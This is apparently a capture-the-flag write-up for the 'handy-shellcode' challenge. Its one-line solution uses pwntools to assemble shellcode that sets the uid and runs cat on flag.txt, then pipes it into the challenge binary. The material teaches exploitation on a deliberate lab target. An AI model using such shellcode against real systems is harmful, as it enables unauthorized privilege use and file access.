# handy-shellcode 

## Summary

This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405 on the shell server. Source.

## Solution

```sh
cd /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405; python -c 'from pwn import *; print(asm(shellcraft.setuid(1002) + shellcraft.execve(path="/bin/cat", argv=["/bin/cat","./flag.txt"])))' | ./vuln;echo
```
